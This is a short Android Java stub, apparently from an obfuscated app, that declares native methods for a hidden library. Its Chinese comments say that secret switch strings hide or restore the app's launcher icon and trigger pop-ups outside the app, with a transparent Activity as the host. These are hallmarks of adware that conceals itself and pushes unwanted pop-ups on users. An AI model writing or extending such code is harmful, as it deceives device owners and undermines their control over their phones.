package azshow.sl;


/**
 * Date：2025/7/28
 * Describe:
 * x2.f.a
 */
// todo 改成和so.txt 中注册的信息
public class lo {

    //注意:用你们自己提供的对应功能的开关参数->比如:num包含"jumjum"隐藏图标,num包含"mepmep"恢复隐藏.num包含"getget"外弹(外弹在主进程主线程调用).
    public static native void loTx(int a, double b, String num);

    public static native void loh(Object context);//1.传应用context.(在主进程里面初始化一次)

    //    @Keep
    public static native void loc(Object context);//1.传透明Activity对象(在透明页面onCreate调用).

    //    @Keep
    public static native void lod(int idex);
}
